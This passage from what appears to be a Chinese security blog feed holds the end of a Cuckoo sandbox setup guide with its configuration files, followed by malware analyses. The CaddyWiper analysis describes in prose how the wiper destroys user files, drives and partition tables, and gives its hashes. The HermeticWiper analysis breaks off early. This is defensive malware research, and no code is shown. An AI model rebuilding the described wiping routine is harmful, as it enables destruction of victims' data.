name of the machinery module to use, this module will</span><br><span class="hljs-comment"># define the interaction between Cuckoo and your virtualization software</span><br><span class="hljs-comment"># of choice.</span><br>machinery = virtualbox<br><br><span class="hljs-comment"># Enable creation of memory dump of the analysis machine before shutting</span><br><span class="hljs-comment"># down. Even if turned off, this functionality can also be enabled at</span><br><span class="hljs-comment"># submission. Currently available for: VirtualBox and libvirt modules (KVM).</span><br>memory_dump = no<br><br><span class="hljs-comment"># When the timeout of an analysis is hit, the VM is just killed by default.</span><br><span class="hljs-comment"># For some long-running setups it might be interesting to terminate the</span><br><span class="hljs-comment"># monitored processes before killing the VM so that connections are closed.</span><br>terminate_processes = no<br><br><span class="hljs-comment"># Enable automatically re-schedule of &quot;broken&quot; tasks each startup.</span><br><span class="hljs-comment"># Each task found in status &quot;processing&quot; is re-queued for analysis.</span><br>reschedule = no<br><br><span class="hljs-comment"># Enable processing of results within the main cuckoo process.</span><br><span class="hljs-comment"># This is the default behavior but can be switched off for setups that</span><br><span class="hljs-comment"># require high stability and process the results in a separate task.</span><br>process_results = yes<br><br><span class="hljs-comment"># Limit the amount of analysis jobs a Cuckoo process goes through.</span><br><span class="hljs-comment"># This can be used together with a watchdog to mitigate risk of memory leaks.</span><br>max_analysis_count = 0<br><br><span class="hljs-comment"># Limit the number of concurrently executing analysis machines.</span><br><span class="hljs-comment"># This may be useful on systems with limited resources.</span><br><span class="hljs-comment"># Set to 0 to disable any limits.</span><br>max_machines_count = 0<br><br><span class="hljs-comment"># Limit the amount of VMs that are allowed to start in parallel. Generally</span><br><span class="hljs-comment"># speaking starting the VMs is one of the more CPU intensive parts of the</span><br><span class="hljs-comment"># actual analysis. This option tries to avoid maxing out the CPU completely.</span><br>max_vmstartup_count = 10<br><br><span class="hljs-comment"># Minimum amount of free space (in MB) available before starting a new task.</span><br><span class="hljs-comment"># This tries to avoid failing an analysis because the reports can&#x27;t be written</span><br><span class="hljs-comment"># due out-of-diskspace errors. Setting this value to 0 disables the check.</span><br><span class="hljs-comment"># (Note: this feature is currently not supported under Windows.)</span><br>freespace = 1024<br><br><span class="hljs-comment"># Temporary directory containing the files uploaded through Cuckoo interfaces</span><br><span class="hljs-comment"># (api.py and Django web interface). Defaults to the default temporary</span><br><span class="hljs-comment"># directory of the operating system (e.g., /tmp on Linux). Overwrite the value</span><br><span class="hljs-comment"># if you&#x27;d like to specify an alternative path.</span><br>tmppath = <br><br><span class="hljs-comment"># Path to the unix socket for running root commands.</span><br>rooter = /tmp/cuckoo-rooter<br><br>[feedback]<br><span class="hljs-comment"># Cuckoo is capable of sending &quot;developer feedback&quot; to the developers so that</span><br><span class="hljs-comment"># they can more easily improve the project. This functionality also allows the</span><br><span class="hljs-comment"># user to quickly request new features, report bugs, and get in touch with</span><br><span class="hljs-comment"># support in general, etc.</span><br>enabled = no<br>name = <br>company = <br>email = <br><br>[resultserver]<br><span class="hljs-comment"># The Result Server is used to receive in real time the behavioral logs</span><br><span class="hljs-comment"># produced by the analyzer.</span><br><span class="hljs-comment"># Specify the IP address of the host. The analysis machines should be able</span><br><span class="hljs-comment"># to contact the host through such address, so make sure it&#x27;s valid.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> if you set resultserver IP to 0.0.0.0 you have to set the option</span><br><span class="hljs-comment"># `resultserver_ip` for all your virtual machines in machinery configuration.</span><br>ip = 192.168.56.1<br><br><span class="hljs-comment"># Specify a port number to bind the result server on. Set to 0 to use a random</span><br><span class="hljs-comment"># port.</span><br>port = 2042<br><br><span class="hljs-comment"># Maximum size of uploaded files from VM (screenshots, dropped files, log).</span><br><span class="hljs-comment"># The value is expressed in bytes, by default 128 MB.</span><br>upload_max_size = 134217728<br><br>[processing]<br><span class="hljs-comment"># Set the maximum size of analyses generated files to process. This is used</span><br><span class="hljs-comment"># to avoid the processing of big files which may take a lot of processing</span><br><span class="hljs-comment"># time. The value is expressed in bytes, by default 128 MB.</span><br>analysis_size_limit = 134217728<br><br><span class="hljs-comment"># Enable or disable DNS lookups.</span><br>resolve_dns = yes<br><br><span class="hljs-comment"># Enable PCAP sorting, needed for the connection content view in the web interface.</span><br>sort_pcap = yes<br><br>[database]<br><span class="hljs-comment"># Specify the database connection string.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> If you are using a custom database (different from sqlite), you have to</span><br><span class="hljs-comment"># use utf-8 encoding when issuing the SQL database creation statement.</span><br><span class="hljs-comment"># Examples, see documentation for more:</span><br><span class="hljs-comment"># sqlite:///foo.db</span><br><span class="hljs-comment"># postgresql://foo:bar@localhost:5432/mydatabase</span><br><span class="hljs-comment"># mysql://foo:bar@localhost/mydatabase</span><br><span class="hljs-comment"># If empty, defaults to a SQLite3 database at $CWD/cuckoo.db.</span><br>connection = <br><br><span class="hljs-comment"># Database connection timeout in seconds.</span><br><span class="hljs-comment"># If empty, default is set to 60 seconds.</span><br>timeout = 60<br><br>[timeouts]<br><span class="hljs-comment"># Set the default analysis timeout expressed in seconds. This value will be</span><br><span class="hljs-comment"># used to define after how many seconds the analysis will terminate unless</span><br><span class="hljs-comment"># otherwise specified at submission.</span><br>default = 120<br><br><span class="hljs-comment"># Set the critical timeout expressed in (relative!) seconds. It will be added</span><br><span class="hljs-comment"># to the default timeout above and after this timeout is hit</span><br><span class="hljs-comment"># Cuckoo will consider the analysis failed and it will shutdown the machine</span><br><span class="hljs-comment"># no matter what. When this happens the analysis results will most likely</span><br><span class="hljs-comment"># be lost.</span><br>critical = 60<br><br><span class="hljs-comment"># Maximum time to wait for virtual machine status change. For example when</span><br><span class="hljs-comment"># shutting down a vm. Default is 60 seconds.</span><br>vm_state = 60<br><br>[remotecontrol]<br><span class="hljs-comment"># Enable for remote control of analysis machines inside the web interface.</span><br>enabled = no<br><br><span class="hljs-comment"># Set host of the running guacd service.</span><br>guacd_host = localhost<br><br><span class="hljs-comment"># Set port of the running guacd service.</span><br>guacd_port = 4822<br></code></pre></td></tr></table></figure><h3 id="auxiliary-conf"><a href="#auxiliary-conf" class="headerlink" title="auxiliary.conf"></a>auxiliary.conf</h3><p>sniffer enabled &#x3D;yes</p><figure class="highlight ini"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br></pre></td><td class="code"><pre><code class="hljs ini"><span class="hljs-section">[sniffer]</span><br><span class="hljs-comment"># Enable or disable the use of an external sniffer (tcpdump) [yes/no].</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">yes</span><br><br><span class="hljs-comment"># Specify the path to your local installation of tcpdump. Make sure this</span><br><span class="hljs-comment"># path is correct.</span><br><span class="hljs-attr">tcpdump</span> = /usr/sbin/tcpdump<br><br><span class="hljs-comment"># We used to define the network interface to capture on in auxiliary.conf, but</span><br><span class="hljs-comment"># this has been moved to the &quot;interface&quot; field of each Virtual Machinery</span><br><span class="hljs-comment"># configuration.</span><br><br><span class="hljs-comment"># Specify a Berkeley packet filter to pass to tcpdump.</span><br><span class="hljs-comment"># <span class="hljs-doctag">Note:</span> packer filtering is not possible when using &quot;nictrace&quot; functionality</span><br><span class="hljs-comment"># from VirtualBox (for example dumping inter-VM traffic).</span><br><span class="hljs-attr">bpf</span> = <br><br><span class="hljs-section">[mitm]</span><br><span class="hljs-comment"># Enable man in the middle proxying (mitmdump) [yes/no].</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">no</span><br><br><span class="hljs-comment"># Specify the path to your local installation of mitmdump. Make sure this</span><br><span class="hljs-comment"># path is correct.</span><br><span class="hljs-attr">mitmdump</span> = /usr/local/bin/mitmdump<br><br><span class="hljs-comment"># Listen port base. Each virtual machine will use its own port to be</span><br><span class="hljs-comment"># able to make a good distinction between the various running analyses.</span><br><span class="hljs-comment"># Generally port 50000 should be fine, in this case port 50001, 50002, etc</span><br><span class="hljs-comment"># will also be used - again, one port per analyses.</span><br><span class="hljs-attr">port_base</span> = <span class="hljs-number">50000</span><br><br><span class="hljs-comment"># Script file to interact with the network traffic. Please refer to the</span><br><span class="hljs-comment"># documentation of mitmproxy/mitmdump to get an understand of their internal</span><br><span class="hljs-comment"># workings. (https://mitmproxy.org/doc/scripting/inlinescripts.html)</span><br><span class="hljs-attr">script</span> = stuff/mitm.py<br><br><span class="hljs-comment"># Path to the certificate to be used by mitmdump. This file will be</span><br><span class="hljs-comment"># automatically generated for you if you run mitmdump once. It&#x27;s just that</span><br><span class="hljs-comment"># you have to copy it from ~/.mitmproxy/mitmproxy-ca-cert.p12 to somewhere</span><br><span class="hljs-comment"># in the analyzer/windows/ directory. Recommended is to write the certificate</span><br><span class="hljs-comment"># to analyzer/windows/bin/cert.p12, in that case the following option should</span><br><span class="hljs-comment"># be set to bin/cert.p12.</span><br><span class="hljs-attr">certificate</span> = bin/cert.p12<br><br><span class="hljs-section">[replay]</span><br><span class="hljs-comment"># Enable PCAP replay capabilities.</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">yes</span><br><br><span class="hljs-comment"># Specify the path to your local installation of mitmdump. Make sure this</span><br><span class="hljs-comment"># path is correct. Note that this should be mitmproxy 3.0.5 or higher,</span><br><span class="hljs-comment"># installed in a separate virtualenv (or similar).</span><br><span class="hljs-attr">mitmdump</span> = /usr/local/bin/mitmdump<br><br><span class="hljs-comment"># Listen port base. Each virtual machine will use its own port to be</span><br><span class="hljs-comment"># able to make a good distinction between the various running analyses.</span><br><span class="hljs-comment"># Generally port 51000 should be fine, in this case port 51001, 51002, etc</span><br><span class="hljs-comment"># will also be used - again, one port per analyses.</span><br><span class="hljs-attr">port_base</span> = <span class="hljs-number">51000</span><br><br><span class="hljs-comment"># Path to the certificate to be used by mitmdump. This file will be</span><br><span class="hljs-comment"># automatically generated for you if you run mitmdump once. It&#x27;s just that</span><br><span class="hljs-comment"># you have to copy it from ~/.mitmproxy/mitmproxy-ca-cert.p12 to somewhere</span><br><span class="hljs-comment"># in the analyzer/windows/ directory. Recommended is to write the certificate</span><br><span class="hljs-comment"># to analyzer/windows/bin/cert.p12, in that case the following option should</span><br><span class="hljs-comment"># be set to bin/cert.p12.</span><br><span class="hljs-attr">certificate</span> = bin/cert.p12<br><br><span class="hljs-section">[services]</span><br><span class="hljs-comment"># Provide extra services accessible through the network of the analysis VM</span><br><span class="hljs-comment"># provided in separate, standalone, Virtual Machines [yes/no].</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">no</span><br><br><span class="hljs-comment"># Comma-separated list with each Virtual Machine containing said service(s).</span><br><span class="hljs-attr">services</span> = honeyd<br><br><span class="hljs-comment"># Time in seconds required to boot these virtual machines. E.g., some services</span><br><span class="hljs-comment"># will only get online after a minute because initialization takes a while.</span><br><span class="hljs-attr">timeout</span> = <span class="hljs-number">0</span><br><br><span class="hljs-section">[reboot]</span><br><span class="hljs-comment"># This auxiliary module should be enabled for reboot analysis support.</span><br><span class="hljs-attr">enabled</span> = <span class="hljs-literal">yes</span><br></code></pre></td></tr></table></figure><h3 id="virtualbox-conf"><a href="#virtualbox-conf" class="headerlink" title="virtualbox.conf"></a>virtualbox.conf</h3><figure class="highlight makefile"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br></pre></td><td class="code"><pre><code class="hljs makefile">[virtualbox]<br><span class="hljs-comment"># Specify which VirtualBox mode you want to run your machines on.</span><br><span class="hljs-comment"># Can be &quot;gui&quot; or &quot;headless&quot;. Please refer to VirtualBox&#x27;s official</span><br><span class="hljs-comment"># documentation to understand the differences.</span><br>mode = headless<br><br><span class="hljs-comment"># Path to the local installation of the VBoxManage utility.</span><br>path = /usr/bin/VBoxManage<br><span class="hljs-comment"># If you are running Cuckoo on Mac OS X you have to change the path as follows:</span><br><span class="hljs-comment"># path = /Applications/VirtualBox.app/Contents/MacOS/VBoxManage</span><br><br><span class="hljs-comment"># Default network interface.</span><br>interface = vboxnet0   <span class="hljs-comment">#//网卡名称</span><br><br><span class="hljs-comment"># Specify a comma-separated list of available machines to be used. For each</span><br><span class="hljs-comment"># specified ID you have to define a dedicated section containing the details</span><br><span class="hljs-comment"># on the respective machine. (E.g. cuckoo1,cuckoo2,cuckoo3)</span><br>machines = win7     <span class="hljs-comment">#//guest虚拟机机名称</span><br><br><span class="hljs-comment"># If remote control is enabled in cuckoo.conf, specify a port range to use.</span><br><span class="hljs-comment"># Virtualbox will bind the VRDP interface to the first available port.</span><br>controlports = 5000-5050<br><br><br>[win7]<br><span class="hljs-comment"># Specify the label name of the current machine as specified in your</span><br><span class="hljs-comment"># VirtualBox configuration.</span><br>label = win7    <br><br><span class="hljs-comment"># Specify the operating system platform used by current machine</span><br><span class="hljs-comment"># [windows/darwin/linux].</span><br>platform = windows  <br><br><span class="hljs-comment"># Specify the IP address of the current virtual machine. Make sure that the</span><br><span class="hljs-comment"># IP address is valid and that the host machine is able to reach it. If not,</span><br><span class="hljs-comment"># the analysis will fail.</span><br>ip = 192.168.56.101   <span class="hljs-comment">#//guest IP</span><br><br><span class="hljs-comment"># (Optional) Specify the snapshot name to use. If you do not specify a snapshot</span><br><span class="hljs-comment"># name, the VirtualBox MachineManager will use the current snapshot.</span><br><span class="hljs-comment"># Example (Snapshot1 is the snapshot name):</span><br>snapshot = Snapshot 1    <span class="hljs-comment">#//快照名</span><br><br><span class="hljs-comment"># (Optional) Specify the name of the network interface that should be used</span><br><span class="hljs-comment"># when dumping network traffic from this machine with tcpdump. If specified,</span><br><span class="hljs-comment"># overrides the default interface specified in auxiliary.conf</span><br><span class="hljs-comment"># Example (vboxnet0 is the interface name):</span><br>interface = vboxnet0<br><br><span class="hljs-comment"># (Optional) Specify the IP of the Result Server, as your virtual machine sees it.</span><br><span class="hljs-comment"># The Result Server will always bind to the address and port specified in cuckoo.conf,</span><br><span class="hljs-comment"># however you could set up your virtual network to use NAT/PAT, so you can specify here</span><br><span class="hljs-comment"># the IP address for the Result Server as your machine sees it. If you don&#x27;t specify an</span><br><span class="hljs-comment"># address here, the machine will use the default value from cuckoo.conf.</span><br><span class="hljs-comment"># <span class="hljs-doctag">NOTE:</span> if you set this option you have to set result server IP to 0.0.0.0 in cuckoo.conf.</span><br><span class="hljs-comment"># Example:</span><br>resultserver_ip = <br><br><span class="hljs-comment"># (Optional) Specify the port for the Result Server, as your virtual machine sees it.</span><br><span class="hljs-comment"># The Result Server will always bind to the address and port specified in cuckoo.conf,</span><br><span class="hljs-comment"># however you could set up your virtual network to use NAT/PAT, so you can specify here</span><br><span class="hljs-comment"># the port for the Result Server as your machine sees it. If you don&#x27;t specify a port</span><br><span class="hljs-comment"># here, the machine will use the default value from cuckoo.conf.</span><br><span class="hljs-comment"># Example:</span><br>resultserver_port = <br><br><span class="hljs-comment"># (Optional) Set your own tags. These are comma separated and help to identify</span><br><span class="hljs-comment"># specific VMs. You can run samples on VMs with tag you require.</span><br>tags = <br><br><span class="hljs-comment"># Mostly unused for now. Please don&#x27;t fill it out.</span><br>options = <br><br><span class="hljs-comment"># (Optional) Specify the OS profile to be used by volatility for this</span><br><span class="hljs-comment"># virtual machine. This will override the guest_profile variable in</span><br><span class="hljs-comment"># memory.conf which solves the problem of having multiple types of VMs</span><br><span class="hljs-comment"># and properly determining which profile to use.</span><br>osprofile = <br><br><br>[honeyd]<br><span class="hljs-comment"># For more information on this VM please refer to the &quot;services&quot; section of</span><br><span class="hljs-comment"># the conf/auxiliary.conf configuration file. This machine is a bit special</span><br><span class="hljs-comment"># in the way that its used as an additional VM for an analysis.</span><br><span class="hljs-comment"># *NOTE* that if this functionality is used, the VM should be registered in</span><br><span class="hljs-comment"># the &quot;machines&quot; list in the beginning of this file.</span><br>label = honeyd<br>platform = linux<br>ip = 192.168.56.102<br><span class="hljs-comment"># The tags should at least contain &quot;service&quot; and the name of this service.</span><br><span class="hljs-comment"># This way the services auxiliary module knows how to find this particular VM.</span><br>tags = service, honeyd<br><span class="hljs-comment"># Not all services actually have a Cuckoo Agent running in the VM, for those</span><br><span class="hljs-comment"># services one can specify the &quot;noagent&quot; option so Cuckoo will just wait until</span><br><span class="hljs-comment"># the end of the analysis instead of trying to connect to the non-existing</span><br><span class="hljs-comment"># Cuckoo Agent. We can&#x27;t really intercept any inter-VM communication from the</span><br><span class="hljs-comment"># host / gateway so in order to dump traffic between VMs we have to use a</span><br><span class="hljs-comment"># different network dumping approach. For this machine we use the &quot;nictrace&quot;</span><br><span class="hljs-comment"># functionality from VirtualBox (which is basically their internal tcpdump)</span><br><span class="hljs-comment"># and thus properly dumps inter-VM traffic.</span><br>options = nictrace noagent<br></code></pre></td></tr></table></figure><h2 id="运行Cuckoo"><a href="#运行Cuckoo" class="headerlink" title="运行Cuckoo"></a>运行Cuckoo</h2><p>执行</p><figure class="highlight ebnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ebnf"><span class="hljs-attribute">cuckoo -d</span><br></code></pre></td></tr></table></figure><p>观察是否存在报错</p><p>没有报错执行</p><figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs nginx"><span class="hljs-attribute">cuckoo</span> web runserver <span class="hljs-number">0.0.0.0:8000</span><br></code></pre></td></tr></table></figure><p>启动cuckoo web界面</p><p>访问127.0.0.0:8000</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419145034415.png" alt="image-20220419145034415"></p><p>上传一个文件，观察cuckoo -d控制台输出以及文件报告是否正常，存在异常进行排错</p><p><img src="/2022/04/19/%E6%90%AD%E5%BB%BA%E7%AE%80%E5%8D%95%E7%9A%84Cuckoo%E6%B2%99%E7%AE%B1/image-20220419161131293.png" alt="image-20220419161131293"></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>东西太老了对于新人各种坑，各种不适配</p><p>而且简单搭建的cuckoo其实作用不大，也就是一个简单的框架，还是需要二次开发的</p><p>在文件支持格式、反沙箱、反逃逸、多文件多guest并发等方面都需要厂商去完善</p>]]></content>
    
    
    <categories>
      
      <category>基础知识</category>
      
    </categories>
    
    
    <tags>
      
      <tag>cuckoo</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>CaddyWiper病毒分析</title>
    <link href="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>3月14日，研究人员在针对乌克兰组织的攻击中观察到新的数据擦除恶意软件CaddyWiper，这种恶意软件会从连接的驱动器中删除用户数据和分区信息，目前已在少数组织的几十个系统上观察到了该恶意软件。该恶意软件是通过组策略对象( GPO )部署的，这表明攻击者事先已经控制了目标的网络。这是自 2022 年初以来在乌克兰攻击中部署的第四种数据擦除恶意软件。对此次新出现的“CaddyWiper”恶意软件，基本信息如下：</p><table><thead><tr><th>文件名</th><th>CaddyWiper.exe</th></tr></thead><tbody><tr><td>MD5</td><td>42E52B8DAF63E6E26C3AA91E7E971492</td></tr><tr><td>SHA1</td><td>98B3FB74B3E8B3F9B05A82473551C5A77B576D54</td></tr><tr><td>CRC32</td><td>11A104D8</td></tr><tr><td>文件大小</td><td>9,216字节</td></tr><tr><td>病毒类型</td><td>HEUR:Trojan.Win32.Generic</td></tr></tbody></table><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p>获取样本基本信息，可以发现程序没有经过数字签名、未加壳，版本信息为VC++，2022年3月14日编译成功。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164220671.png" alt="image-20220414164220671"></p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164231056.png" alt="image-20220414164231056"></p><p>样本没有资源，没有图标，导入函数及字符串都极其简单。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164250657.png" alt="image-20220414164250657"></p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164304236.png" alt="image-20220414164304236"></p><h3 id="动态运行分析"><a href="#动态运行分析" class="headerlink" title="动态运行分析"></a>动态运行分析</h3><p>虚拟机运行样本后发现，样本会在运行后极短时间内引起系统蓝屏，自动重启后找不到系统，显示“Operating System not found”。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164447838.png" alt="image-20220414164447838"></p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164457760.png" alt="image-20220414164457760"></p><h3 id="静态分析"><a href="#静态分析" class="headerlink" title="静态分析"></a>静态分析</h3><p>通过拼接字符串调用kernel32.dll。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164529634.png" alt="image-20220414164529634"></p><p>主函数首先通过首先执行“DsRoleGetPrimaryDomainInformation”获取域数据，以确定样本正在运行的系统的机器角色。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164547711.png" alt="image-20220414164547711"></p><p>如果域角色是等于5，即为“DsRole_RolePrimaryDomainController”域控制器，样本将终止并且不会继续执行任何破坏性功能。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164616417.png" alt="image-20220414164616417"></p><p>如果目标系统不是域控制器，样本开始递归擦除“C:&#x2F;&#x2F;Users”中的所有数据，包括隐藏文件和操作系统文件。如果文件大于 10 兆字节，擦除器只会破坏前 10 兆字节。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164631323.png" alt="image-20220414164631323"></p><p>如果文件当前被另一个进程锁定，样本首先尝试通过“SeTakeOwnershipPrivilege”获取文件的所有权，然后继续擦除文件。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164646211.png" alt="image-20220414164646211"></p><p>在“C:\Users”之后，对从“D:\ ”到“Z:\ ”的所有可用驱动器重复相同的过程。</p><p>当所有可用的驱动器都被擦除后，通过用 NULL 覆盖前 1920 个字节来擦除从“\.\PHYSICALDRIVE9”到“\.\PHYSICALDRIVE0”的磁盘分区。</p><p><img src="/2022/04/15/CaddyWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414164730916.png" alt="image-20220414164730916"></p><h2 id="IOCs"><a href="#IOCs" class="headerlink" title="IOCs"></a>IOCs</h2><p><strong>MD5</strong>:</p><p>42E52B8DAF63E6E26C3AA91E7E971492</p>]]></content>
    
    
    <categories>
      
      <category>样本分析</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CaddyWiper</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>HermeticWiper病毒分析</title>
    <link href="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/"/>
    <url>/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/</url>
    
    <content type="html"><![CDATA[<p>俄乌网络战中出现的四种数据擦除器：</p><table><thead><tr><th align="center"></th><th align="center">发现时间</th></tr></thead><tbody><tr><td align="center">WhisperGate</td><td align="center">2022年1月13日</td></tr><tr><td align="center"><em><strong>HermeticWiper</strong></em></td><td align="center"><em><strong>2022年2月24日</strong></em></td></tr><tr><td align="center">IsaacWiper</td><td align="center">2022年2月24日</td></tr><tr><td align="center">CaddyWiper</td><td align="center">2022年3月14日</td></tr></tbody></table><h2 id="样本信息"><a href="#样本信息" class="headerlink" title="样本信息"></a>样本信息</h2><p>2022年2月24日，俄乌冲突逐渐升级。一款名为“ HermeticWiper”（又名KillDisk.NCV）的新型数据擦除恶意软件在乌克兰的数百台重要的计算机上被发现，涉及乌克兰的金融和政府承包商，导致相关组织的系统设备数据遭到摧毁，其中一次入侵涉及直接从Windows域控制器部署恶意软件。此次攻击还包括HermeticWizard（横向移动）、HermeticRansom（加密勒索）两个组件，但是样本质量不高，影响不大，真正构成威胁的仍是“HermeticWiper”。对于“HermeticWiper”恶意软件，详情如下：</p><table><thead><tr><th>文件名</th><th>HermeticWiper.exe</th></tr></thead><tbody><tr><td>MD5</td><td>3F4A16B29F2F0532B7CE3E7656799125</td></tr><tr><td>SHA1</td><td>61B25D11392172E587D8DA3045812A66C3385451</td></tr><tr><td>CRC32</td><td>4D4E5EAD</td></tr><tr><td>文件大小</td><td>117,000 字节</td></tr><tr><td>数字签名</td><td>Hermetica Digital Ltd</td></tr><tr><td>病毒类型</td><td>Trojan.Win32.HermeticWiper.a</td></tr></tbody></table><h2 id="样本分析"><a href="#样本分析" class="headerlink" title="样本分析"></a>样本分析</h2><h3 id="样本基本信息"><a href="#样本基本信息" class="headerlink" title="样本基本信息"></a>样本基本信息</h3><p>样本使用了由“Hermetica Digital Ltd”进行的数字签名(证书目前已被吊销)，通过这种方式来逃避基于WindowsAPI的检测。</p><img src="image-20220414093929205.png" alt="image-20220414093929205" style="zoom: 80%;" /><p>获取样本基本信息，可以发现程序未加壳，版本信息为VC++7.10，由Visual Studio 2017编译，2022年2月23日编译成功。</p><p><img src="/2022/04/14/HermeticWiper%E7%97%85%E6%AF%92%E5%88%86%E6%9E%90/image-20220414094020626.png" alt="image-20220414094020626"></p><p><img 